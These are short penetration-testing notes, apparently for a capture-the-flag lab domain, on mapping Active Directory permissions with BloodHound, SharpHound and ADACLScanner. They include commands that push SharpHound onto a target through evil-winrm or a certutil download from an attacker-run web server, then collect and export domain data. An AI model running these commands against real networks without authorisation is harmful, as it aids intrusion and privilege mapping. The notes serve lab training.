# Check ACL for an User with ADACLScanner/Bloodhound

## Easy Commands to run first

1. Run Bloodhound from local machine (EASIEST)`bloodhound-python -v --zip -c All -u <username> -p <password> -d certified.htb -ns <dc-ip/system-ip>`

2. Or run (Not tested) - `ADACLScan.ps1 -Base “DC=contoso;DC=com” -Filter “(&(AdminCount=1))” -Scope subtree` in the target machine. 

## Only for Bloodhound-python/Bloodhound/SharpHound/

3. Upload SharpHound.exe to the target system and export the .json files to the local system.
   i. First Method - Using Evil-Winrm (Best bet)
     a. If you are using evil-winrm - Place the SharpHound.exe in the directory where you started evil-winrm. then `upload SharpHound.exe`
     b. From your Windows target machine - `SharpHound.exe --CollectionMethods All --ZipFileName output.zip`
     c. Or Run from Kali Linux - `SharpHound.exe --CollectionMethod All --LdapUsername <username> --LdapPassword <password> --ZipFileName output.zip`
   ii. Second Method
     a. Spin up a python web server. `python3 -m http.server <if any port>`.
     b. Download SharpHound from localhost - `certutil -f -split -urlcache http://<local-ip>:<port>/SharpHound.exe`
     c. Run this - `SharpHound.exe --CollectionMethods All --ZipFileName output.zip`
     d. Run an SMB Server and extract files. (Complicated)
    
4. Spin up the neo4j database. `sudo neo4j start`
5. Run `sudo bloodhound`.


## 
